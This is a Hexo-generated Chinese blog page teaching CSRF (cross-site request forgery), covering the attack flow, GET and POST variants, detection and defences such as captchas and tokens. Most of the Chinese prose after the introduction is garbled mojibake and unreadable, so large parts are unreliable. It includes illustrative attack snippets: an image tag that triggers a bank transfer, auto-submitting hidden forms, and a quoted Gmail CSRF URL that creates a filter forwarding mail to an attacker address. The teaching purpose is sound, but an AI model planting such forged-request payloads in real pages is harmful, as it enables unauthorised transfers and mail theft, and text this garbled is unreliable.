@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>CSRF | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="CSRF一、什么是CSRF? CSRF (Cross-site request forgery跨站请求伪造)也称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。 简单的说，是攻击者通过一些技术">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSRF">
+<meta property="og:url" content="http://example.com/2024/05/20/Web/CSRF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="CSRF一、什么是CSRF? CSRF (Cross-site request forgery跨站请求伪造)也称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。 简单的说，是攻击者通过一些技术">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/.com//image-20250520024626-zm1u5u8.png">
+<meta property="og:image" content="http://example.com/.com//image-20250520024642-rrrnihd.png">
+<meta property="og:image" content="http://example.com/assets/image-20250520025130-b7gdarh.png">
+<meta property="og:image" content="http://example.com/assets/image-20250520025142-8swgbme.png">
+<meta property="og:image" content="http://example.com/assets/image-20250520025208-tr38ddf.png">
+<meta property="og:image" content="http://example.com/assets/image-20250520025334-kgrwlzn.png">
+<meta property="article:published_time" content="2024-05-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-20T09:16:16.910Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CSRF">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/.com//image-20250520024626-zm1u5u8.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Web/CSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/05/20/Web/CSRF/" class="article-date">
+  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      CSRF
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="一、什么是CSRF"><a href="#一、什么是CSRF" class="headerlink" title="一、什么是CSRF?"></a>一、什么是CSRF?</h2><blockquote>
+<p>CSRF (Cross-site request forgery跨站请求伪造)也称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。</p>
+<p>简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器曾经认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</p>
+</blockquote>
+<h2 id="浜屻€乕CSRF鏀诲嚮-https-so-csdn-net-so-search-q-CSRF-E6-94-BB-E5-87-BB-spm-1001-2101-3001-7020-鍘熺悊鍙婅繃绋"><a href="#浜屻€乕CSRF鏀诲嚮-https-so-csdn-net-so-search-q-CSRF-E6-94-BB-E5-87-BB-spm-1001-2101-3001-7020-鍘熺悊鍙婅繃绋" class="headerlink" title="浜屻€乕CSRF鏀诲嚮](https://so.csdn.net/so/search?q=CSRF%E6%94%BB%E5%87%BB&amp;spm=1001.2101.3001.7020)鍘熺悊鍙婅繃绋"></a>浜屻€乕CSRF鏀诲嚮](<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=CSRF%E6%94%BB%E5%87%BB&spm=1001.2101.3001.7020)%E9%8D%98%E7%86%BA%E6%82%8A%E9%8D%99%E5%A9%85%E7%B9%83%E7%BB%8B">https://so.csdn.net/so/search?q=CSRF%E6%94%BB%E5%87%BB&amp;spm=1001.2101.3001.7020)鍘熺悊鍙婅繃绋</a></h2><blockquote>
+<p>CSRF涓轰粈涔堣兘澶熸敾鍑绘垚鍔?</p>
+<p>鍏舵湰璐ㄥ師鍥犳槸閲嶈鎿嶄綔鐨勬墍鏈夊弬鏁伴兘鏄彲浠ヨ鏀诲嚮鑰呯寽娴嬪埌鐨勩€</p>
+<p>鏀诲嚮鑰呭彧鏈夐娴嬪嚭URL鐨勬墍鏈夊弬鏁颁笌鍙傛暟鍊硷紝鎵嶈兘鎴愬姛鍦版瀯閫犱竴涓吉閫犵殑璇锋眰;鍙嶄箣锛屾敾鍑昏€呭皢鏃犳硶鏀诲嚮鎴愬姛銆</p>
+</blockquote>
+<p><img src="/.com//image-20250520024626-zm1u5u8.png" alt="image"></p>
+<p>浠庝笂鍥捐兘澶熺湅鍑猴紝瑕佸畬姣曚竴娆SRF鏀诲嚮锛屽彈瀹宠€呭繀椤讳緷娆″畬姣曚袱涓楠わ細</p>
+<blockquote>
+<pre><code>    鐧诲綍鍙椾俊浠荤珯鐐笰锛屽苟鍦ㄦ湰鍦扮敓鎴怌ookie銆�
+
+    鍦ㄤ笉鐧诲嚭A鐨勬儏鍐典笅锛岃闂嵄鎬ョ珯鐐笲銆�
+</code></pre>
+</blockquote>
+<p><img src="/.com//image-20250520024642-rrrnihd.png" alt="image"></p>
+<blockquote>
+<p>1銆佸鎴风閫氳繃璐︽埛瀵嗙爜鐧诲綍璁块棶缃戠珯A銆�<br>2銆佺綉绔橝楠岃瘉瀹㈡埛绔橝鐢熸垚涓€涓猻essionlD锛屽苟杩斿洖缁欏鎴风瀛樺偍鍦ㄦ祻瑙堝櫒涓€<br>2銆佺綉绔橝楠岃瘉瀹㈡埛绔殑璐﹀彿瀵嗙爜锛屾垚鍔熷垯鐢熸垚涓€涓猻essionlD锛屽苟杩斿洖缁欏鎴风瀛樺偍鍦ㄦ祻瑙堝櫒涓€�<br>3銆佽瀹㈡埛绔疶ab鈥斾釜鏂伴〉闈㈣闂簡缃戠珯B銆�<br>4銆佺綉绔橞鑷姩瑙﹀彂瑕佹眰璇ュ鎴风璁块棶缃戠珯A銆�(鍗冲湪缃戠珯B涓湁閾炬帴鎸囧悜缃戠珯A)<br>5銆佸鎴风閫氳繃缃戠珯B涓殑閾炬帴璁块棶缃戠珯A銆�(姝ゆ椂鎼哄甫鏈夊悎娉曠殑SessionID杩涜璁块棶绔橝鐨�)<br>6銆佹鏃剁綉绔橝鍙渶妫€楠宻essionIlD鏄惁鍚堟硶锛屽悎娉曞垯鎵ц鐩稿簲鐨勬搷浣溿€�(鍥犳鍏蜂綋鍟ュ伐鍏峰氨寰楃湅閾炬帴锛屼互鍙婄綉绔橞瑕佹眰璁块棶鏃舵惡甯︾殑鏁版嵁)</p>
+</blockquote>
+<p>鎵€浠ヨ琚獵SRF鏀诲嚮锛屽繀椤诲悓鏃舵弧瓒充袱涓潯浠讹細</p>
+<p>鐧诲綍鍙椾俊浠荤綉绔橝锛屽苟鍦ㄦ湰鍦扮敓鎴怌ookie銆� 鍦ㄤ笉鐧诲嚭A鐨勬儏鍐典笅锛岃闂嵄闄╃綉绔橞銆�</p>
+<hr>
+<h2 id="涓夈€丆SRF鍒嗙被"><a href="#涓夈€丆SRF鍒嗙被" class="headerlink" title="涓夈€丆SRF鍒嗙被"></a>涓夈€丆SRF鍒嗙被</h2><p>CSRF(Cross-Site Request Forgery)锛岃窡XSS婕忔礊鏀诲嚮涓€鏍凤紝瀛樺湪宸ㄥぇ鐨勫嵄瀹虫€с€�</p>
+<p>浣犲彲浠ヨ繖涔堟潵鐞嗚В:鏀诲嚮鑰呯洍鐢ㄤ簡浣犵殑韬唤锛屼互浣犵殑鍚嶄箟鍙戦€佹伓鎰忚姹傦紝瀵规湇鍔″櫒鏉ヨ杩欎釜璇锋眰鏄畬鍏ㄥ悎娉曠殑锛屼絾鏄嵈瀹屾垚浜嗘敾鍑昏€呮墍鏈熸湜鐨勪竴涓搷浣滐紝姣斿浠ヤ綘鐨勫悕涔夊彂閫侀偖浠躲€佸彂娑堟伅锛岀洍鍙栦綘鐨勮处鍙凤紝娣诲姞绯荤粺绠＄悊鍛橈紝鐢氳嚦浜庤喘涔板晢鍝併€佽櫄鎷熻揣甯佽浆璐︾瓑</p>
+<h3 id="1-GET绫诲瀷鐨凜SRF"><a href="#1-GET绫诲瀷鐨凜SRF" class="headerlink" title="1. GET绫诲瀷鐨凜SRF"></a>1. GET绫诲瀷鐨凜SRF</h3><p>1.GET绫诲瀷鐨凜SRF</p>
+<p>浠呬粎椤昏涓€涓狧TTP璇锋眰銆傚氨鑳藉鏋勯€犱竴娆＄畝鍗曠殑CSRF銆�</p>
+<p>鏍蜂緥锛�</p>
+<p>閾惰绔欑偣A锛氬畠浠ET璇锋眰鏉ュ畬姣曢摱琛岃浆璐︾殑鎿嶄綔锛屽锛�</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000 </span><br></pre></td></tr></table></figure>
+
+<p>鍗遍櫓绔欑偣B锛氬畠閲岄潰鏈変竴娈礖TML鐨勪唬鐮佷緥濡備互涓嬶細</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="attr">http</span>:<span class="comment">//www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>棣栧厛銆備綘鐧诲綍浜嗛摱琛岀珯鐐笰锛岀劧鍚庤闂嵄闄╃珯鐐笲锛屽櫌锛岃繖鏃朵綘浼氬彂鐜颁綘鐨勯摱琛岃处鎴峰皯浜�1000鍧椼€�</p>
+<p>涓轰粈涔堜細杩欐牱鍛紵鍘熷洜鏄摱琛岀珯鐐笰杩濆弽浜咹TTP瑙勮寖锛屼娇鐢℅ET璇锋眰鏇存柊璧勬簮銆�</p>
+<p>鍦ㄨ闂嵄闄╃珯鐐笲鐨勪箣鍓嶃€備綘宸茬粡鐧诲綍浜嗛摱琛岀珯鐐笰锛岃€孊涓殑 涓€涓悎娉曠殑璇锋眰锛屼絾杩欓噷琚笉娉曞垎瀛愬埄鐢ㄤ簡锛夈€�</p>
+<p>鎵€浠ヤ綘鐨勬祻瑙堝櫒浼氬甫涓婁綘鐨勯摱琛岀珯鐐笰鐨凜ookie鍙戝嚭Get璇锋眰锛屽幓鑾峰彇璧勬簮浠ET鐨勬柟寮忚姹傜涓夋柟璧勬簮锛堣繖閲岀殑绗笁鏂瑰氨鏄寚閾惰绔欑偣浜嗭級锛�</p>
+<p>鍘熸湰杩欐槸锛�</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</span></span><br></pre></td></tr></table></figure>
+
+<p>缁撴灉閾惰绔欑偣鏈嶅姟鍣ㄦ敹鍒拌姹傚悗锛岃寰楄繖鏄竴涓洿鏂拌祫婧愭搷浣滐紙杞处鎿嶄綔锛夛紝鎵€浠ュ氨绔嬮┈杩涜杞处鎿嶄綔銆�</p>
+<h3 id="2-POST绫诲瀷鐨凜SRF"><a href="#2-POST绫诲瀷鐨凜SRF" class="headerlink" title="2. POST绫诲瀷鐨凜SRF"></a>2. POST绫诲瀷鐨凜SRF</h3><p>鍦–SRF鏀诲嚮娴佽涔嬪垵锛屾浘缁忔湁涓€绉嶉敊璇殑瑙傜偣锛岃涓篊SRF鏀诲嚮鍙兘鐢盙ET璇锋眰鍙戣捣銆傚洜姝ゅ緢澶氬紑鍙戣€呴兘璁や负鍙鎶婇噸瑕佺殑鎿嶄綔鏀规垚鍙厑璁窹OST璇锋眰锛屽氨鑳介槻姝SRF鏀诲嚮銆�</p>
+<p>杩欐牱鐨勯敊璇鐐瑰舰鎴愮殑鍘熷洜涓昏鍦ㄤ簬锛屽ぇ澶氭暟CSRF鏀诲嚮鍙戣捣鏃讹紝浣跨敤鐨凥TML鏍囩閮芥槸<image>銆�<iframe>銆�<script>绛夊甫鈥渟rc&quot;灞炴€х殑鏍囩锛岃繖绫绘爣绛惧彧鑳藉鍙戣捣涓€娆ET璇锋眰锛岃€屼笉鑳藉彂璧稰OST璇锋眰銆�</p>
+<p>鑰屽浜庡緢澶氱綉绔欑殑搴旂敤鏉ヨ锛屼竴浜涢噸瑕佹搷浣滃苟鏈弗鏍煎湴鍖哄垎GET涓嶱OST锛屾敾鍑昏€呭彲浠ヤ娇鐢℅ET鏉ヨ姹傝〃鍗曠殑鎻愪氦鍦板潃銆傛瘮濡傚湪PHP涓紝濡傛灉浣跨敤鐨勬槸$_REQUEST锛岃€岄潪$_POST鑾峰彇鍙橀噺锛屽垯浼氬瓨鍦ㄨ繖涓棶棰樸€�</p>
+<p>瀵逛簬涓€涓〃鍗曟潵璇达紝鐢ㄦ埛寰€寰€涔熷氨鍙互浣跨敤GET鏂瑰紡鎻愪氦鍙傛暟銆傛瘮濡備互涓嬭〃鍗�:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot; / register&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;register&quot;</span> method=<span class="string">&quot;post&quot;</span> &gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=text name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=password name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=submit name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>鐢ㄦ埛鍙皾璇曟瀯閫犱竴涓狦ET璇锋眰</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http: //host/register?username=<span class="built_in">test</span>&amp;password=passwd</span><br></pre></td></tr></table></figure>
+
+<p>鏉ユ彁浜わ紝鑻ユ湇鍔″櫒绔湭瀵硅姹傛柟娉曡繘琛岄檺鍒讹紝鍒欒繖涓姹備細閫氳繃銆�</p>
+<p>濡傛灉鏈嶅姟鍣ㄧ宸茬粡鍖哄垎浜咷ET涓嶱OST锛岄偅涔堟敾鍑昏€呮湁浠€涔堟柟娉曞憿?瀵逛簬鏀诲嚮鑰呮潵璇达紝鑻ュ共绉嶆柟娉曞彲浠ユ瀯閫犲嚭涓€涓狿OST璇锋眰銆�</p>
+<p>鏈€绠€鍗曠殑鏂规硶锛屽氨鏄湪涓€涓〉闈腑鏋勯€犲ソ涓€涓〃鍗曡〃鍗曪紝鐒跺悗浣跨敤JavaScript鑷姩鎻愪氦杩欎釜琛ㄥ崟銆傛瘮濡傦紝鏀诲嚮鑰呭湪<a target="_blank" rel="noopener" href="http://www.b.com/test.html%E6%B6%93%EE%85%A0%E7%B4%AA%E9%8D%90%E6%AC%8F%EE%9B%A7%E6%B6%93%E5%AC%A9%E5%94%AC%E9%90%AE%E4%BE%8A%E7%B4%B0">www.b.com/test.html涓紪鍐欏涓嬩唬鐮侊細</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;http: / / www . a.com/register&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;register&quot;</span> method=<span class="string">&quot;post&quot;</span> &gt;&lt;input <span class="built_in">type</span>=text name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;&quot;</span>/&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=password name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;&quot;</span>/&gt;&lt;input <span class="built_in">type</span>=submit name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>/&gt;&lt;/ form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var f = document.getElementById ( <span class="string">&quot;register&quot;</span>);</span><br><span class="line">f.inputs [0].value = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">f.inputs [1].value = <span class="string">&quot;passwd&quot;</span> ;</span><br><span class="line">f.submit ();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>鏀诲嚮鑰呯敋鑷冲彲浠ュ皢杩欎釜椤甸潰闅愯棌鍦ㄤ竴涓笉鍙鐨刬frame绐楀彛涓紝閭ｄ箞鏁翠釜鑷姩鎻愪氦琛ㄥ崟鐨勮繃绋嬶紝瀵逛簬鐢ㄦ埛鏉ヨ涔熸槸涓嶅彲瑙佺殑銆�</p>
+<p>鍦�2007骞寸殑Gmail CSRF婕忔礊鏀诲嚮杩囩▼涓紝瀹夊叏鐮旂┒鑰卲dp灞曠ず浜嗚繖涓€鎶€宸с€傞鍏堬紝鐢ㄦ埛闇€瑕佺櫥褰旼mail璐︽埛锛屼互渚胯娴忚鍣ㄨ幏寰桮mail鐨勪复鏃禖ookie銆�</p>
+<p><img src="/assets/image-20250520025130-b7gdarh.png" alt="image"></p>
+<p>鐢ㄦ埛鐧诲綍Gmail</p>
+<p>鐒跺悗锛屾敾鍑昏€呰浣跨敤鎴疯闂竴涓伓鎰忛〉闈€€�</p>
+<p><img src="/assets/image-20250520025142-8swgbme.png" alt="image"></p>
+<p>鏀诲嚮鑰呰浣跨敤鎴疯闂伓鎰忛〉闈�</p>
+<p>鍦ㄨ繖涓伓鎰忛〉闈腑锛岄殣钘忎簡涓€涓猧frame锛宨frame鐨勫湴鍧€鎸囧悜pdp鍐欑殑CSRF鏋勯€犻〉闈€€�</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http: //www.gnucitizen.org/util/csrf?_method=POST&amp;_enctype=multipart/form-data&amp;_action=https%3A//mail.google.com/mail/h/ewtljmuj4ddv/%3Fv%3Dprf&amp;cf2_emc=<span class="literal">true</span>&amp;cf2_email=evilinboxmailinator.com&amp;cfl_from&amp;cfl_toucf1_subjicf1_has&amp;cfl_hasnotscf1_attach=truestfi&amp;S=z&amp;irf=on&amp;nvp bu_cftb=Create%20Filter</span><br></pre></td></tr></table></figure></blockquote>
+<p>杩欎釜閾炬帴鐨勫疄闄呬綔鐢ㄥ氨鏄妸鍙傛暟鐢熸垚涓€涓狿OST鐨勮〃鍗曪紝骞惰嚜鍔ㄦ彁浜ゃ€�<br>鐢变簬娴忚鍣ㄤ腑宸茬粡瀛樺湪Gmail鐨勪复鏃禖ookie锛屾墍浠ョ敤鎴峰湪iframe涓Gmail鍙戣捣鐨勮繖娆¤姹備細鎴愬姛鈥曗€旈偖绠辩殑Filter涓細鏂板垱寤轰竴鏉¤鍒欙紝灏嗘墍鏈夊甫闄勪欢鐨勯偖浠堕兘杞彂鍒版敾鍑昏€呯殑閭涓€�</p>
+<p><img src="/assets/image-20250520025208-tr38ddf.png" alt="image"></p>
+<p>鎭舵剰绔欑偣閫氳繃CSRF鍦ㄧ敤鎴风殑Gmail涓缓绔嬩竴鏉¤鍒欍€�</p>
+<p>濡傛灉涓婅堪渚嬪瓙鐪嬪緱杩樻槸鏈夌偣鎳甸€硷紝閭ｅ啀涓句竴涓緥瀛愶細</p>
+<p>鍦ㄦ櫘閫氱敤鎴风殑鐪间腑锛岀偣鍑荤綉椤�-&gt;鎵撳紑璇曠湅瑙嗛-&gt;璐拱瑙嗛鏄竴涓緢姝ｅ父鐨勪竴涓祦绋嬨€傚彲鏄湪鏀诲嚮鑰呯殑鐪间腑鍙互绠楁甯镐絾鍙堜笉姝ｅ父鐨勶紝褰撶劧涓嶆甯哥殑鎯呭喌涓嬶紝鏄湪寮€鍙戣€呭畨鍏ㄦ剰璇嗕笉瓒虫墍閫犳垚鐨勩€傛敾鍑昏€呭湪璐拱澶勬姄鍒拌喘涔版椂鍊欑綉绔欏鐞嗚喘涔�(鎵ｉ櫎)鐢ㄦ埛浣欓鐨勫湴鍧€銆�</p>
+<p>姣斿:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/coures/user/handler666buy.php&lt;/font&gt;</span><br></pre></td></tr></table></figure>
+
+<p>閫氳繃鎻愪氦琛ㄥ崟锛宐uy.php澶勭悊璐拱鐨勪俊鎭紝杩欓噷鐨�666涓鸿棰慖D銆傞偅涔堟敾鍑昏€呯幇鍦ㄦ瀯閫犱竴涓摼鎺ワ紝閾炬帴涓寘鍚互涓嬪唴瀹广€�</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=/coures/user/handler/666/buy method=POST&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;xx&quot;</span> value=<span class="string">&quot;xx&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>褰撶敤鎴疯闂椤甸潰鍚庯紝琛ㄥ崟浼氳嚜鍔ㄦ彁浜わ紝鐩稿綋浜庢ā鎷熺敤鎴峰畬鎴愪簡涓€娆OST鎿嶄綔锛岃嚜鍔ㄨ喘涔颁簡id涓�666鐨勮棰戯紝浠庤€屽鑷村彈瀹宠€呬綑棰濇墸闄ゃ€�</p>
+<hr>
+<h2 id="鍥涖€丆SRF婕忔礊鐨勬寲鎺�"><a href="#鍥涖€丆SRF婕忔礊鐨勬寲鎺�" class="headerlink" title="鍥涖€丆SRF婕忔礊鐨勬寲鎺�"></a>鍥涖€丆SRF婕忔礊鐨勬寲鎺�</h2><p>1銆佹渶绠€鍗曠殑鏂规硶灏辨槸鎶撳彇涓€涓甯歌姹傜殑鏁版嵁鍖咃紝濡傛灉娌℃湁Referer瀛楁鍜宼oken锛岄偅涔堟瀬鏈夊彲鑳藉瓨鍦–SRF婕忔礊銆�</p>
+<p>2銆佸鏋滄湁Referer瀛楁锛屼絾鏄幓鎺塕eferer瀛楁鍚庡啀閲嶆柊鎻愪氦锛屽鏋滆鎻愪氦杩樻湁鏁堬紝閭ｄ箞鍩烘湰涓婂彲浠ョ‘瀹氬瓨鍦–SRF婕忔礊銆�</p>
+<p>3銆侀殢鐫€瀵笴SRF婕忔礊鐮旂┒鐨勪笉鏂繁鍏ワ紝涓嶆柇娑岀幇鍑轰竴浜涗笓闂ㄩ拡瀵笴SRF婕忔礊杩涜妫€娴嬬殑宸ュ叿锛屽CSRFTester锛孋SRF Request Builder绛夈€備互CSRFTester宸ュ叿涓轰緥锛孋SRF婕忔礊妫€娴嬪伐鍏风殑娴嬭瘯鍘熺悊濡備笅:</p>
+<p>浣跨敤CSRFTester杩涜娴嬭瘯鏃讹紝棣栧厛闇€瑕佹姄鍙栨垜浠湪娴忚鍣ㄤ腑璁块棶杩囩殑鎵€鏈夐摼鎺ヤ互鍙婃墍鏈夌殑琛ㄥ崟绛変俊鎭紝鐒跺悗閫氳繃鍦–SRFTester涓慨鏀圭浉搴旂殑琛ㄥ崟绛変俊鎭紝閲嶆柊鎻愪氦锛岃繖鐩稿綋浜庝竴娆′吉閫犲鎴风璇锋眰銆�</p>
+<p>濡傛灉淇敼鍚庣殑娴嬭瘯璇锋眰鎴愬姛琚綉绔欐湇鍔″櫒鎺ュ彈锛屽垯璇存槑瀛樺湪CSRF婕忔礊锛屽綋鐒舵娆惧伐鍏蜂篃鍙互琚敤鏉ヨ繘琛孋SRF鏀诲嚮銆�</p>
+<hr>
+<h2 id="浜斻€丆SRF婕忔礊鐨勯槻寰�"><a href="#浜斻€丆SRF婕忔礊鐨勯槻寰�" class="headerlink" title="浜斻€丆SRF婕忔礊鐨勯槻寰�"></a>浜斻€丆SRF婕忔礊鐨勯槻寰�</h2><h3 id="1銆侀獙璇佺爜"><a href="#1銆侀獙璇佺爜" class="headerlink" title="1銆侀獙璇佺爜"></a>1銆侀獙璇佺爜</h3><p>==楠岃瘉鐮佽璁や负鏄鎶桟SRF鏀诲嚮鏈€绠€娲佽€屾湁鏁堢殑闃插尽鏂规硶銆�==</p>
+<p>CSRF鏀诲嚮鐨勮繃绋嬶紝寰€寰€鏄湪鐢ㄦ埛涓嶇煡鎯呯殑鎯呭喌涓嬫瀯閫犱簡缃戠粶璇锋眰銆傝€岄獙璇佺爜锛屽垯寮哄埗鐢ㄦ埛蹇呴』涓庡簲鐢ㄨ繘琛屼氦浜掞紝鎵嶈兘瀹屾垚鏈€缁堣姹傘€傚洜姝ゅ湪閫氬父鎯呭喌涓嬶紝楠岃瘉鐮佽兘澶熷緢濂藉湴閬忓埗CSRF鏀诲嚮銆�</p>
+<p>浣嗘槸楠岃瘉鐮佸苟闈炰竾鑳姐€傚緢澶氭椂鍊欙紝鍑轰簬鐢ㄦ埛浣撻獙鑰冭檻锛岀綉绔欎笉鑳界粰鎵€鏈夌殑鎿嶄綔閮藉姞涓婇獙璇佺爜銆傚洜姝わ紝楠岃瘉鐮佸彧鑳戒綔涓洪槻寰SRF鐨勪竴绉嶈緟鍔╂墜娈碉紝鑰屼笉鑳戒綔涓烘渶涓昏鐨勮В鍐虫柟妗堛€�</p>
+<h3 id="2銆佸湪璇锋眰鍦板潃涓坊鍔�-token-骞堕獙璇�"><a href="#2銆佸湪璇锋眰鍦板潃涓坊鍔�-token-骞堕獙璇�" class="headerlink" title="2銆佸湪璇锋眰鍦板潃涓坊鍔� token 骞堕獙璇�"></a>2銆佸湪璇锋眰鍦板潃涓坊鍔� token 骞堕獙璇�</h3><p>CSRF 鏀诲嚮涔嬫墍浠ヨ兘澶熸垚鍔燂紝鏄洜涓洪粦瀹㈠彲浠ュ畬鍏ㄤ吉閫犵敤鎴风殑璇锋眰锛岃璇锋眰涓墍鏈夌殑鐢ㄦ埛楠岃瘉淇℃伅閮芥槸瀛樺湪浜� cookie 涓紝鍥犳榛戝鍙互鍦ㄤ笉鐭ラ亾杩欎簺楠岃瘉淇℃伅鐨勬儏鍐典笅鐩存帴鍒╃敤鐢ㄦ埛鑷繁鐨� cookie 鏉ラ€氳繃瀹夊叏楠岃瘉銆�</p>
+<p>瑕佹姷寰� CSRF鍏抽敭鍦ㄤ簬鍦ㄨ姹備腑鏀惧叆榛戝鎵€涓嶈兘浼€犵殑淇℃伅锛屽苟涓旇淇℃伅涓嶅瓨鍦ㄤ簬 cookie 涔嬩腑銆�</p>
+<p><span data-type="text" style="color: var(--b3-font-color8);">鍙互鍦� HTTP 璇锋眰涓互鍙傛暟鐨勫舰寮忓姞鍏ヤ竴涓殢鏈轰骇鐢熺殑 token锛屽苟鍦ㄦ湇鍔″櫒绔缓绔嬩竴涓嫤鎴櫒鏉ラ獙璇佽繖token锛屽鏋滆姹備腑娌℃湁 token 鎴栬€� token 鍐呭涓嶆纭紝鍒欒涓哄彲鑳芥槸 CSRF 鏀诲嚮鑰屾嫆缁濊璇锋眰銆�</span></p>
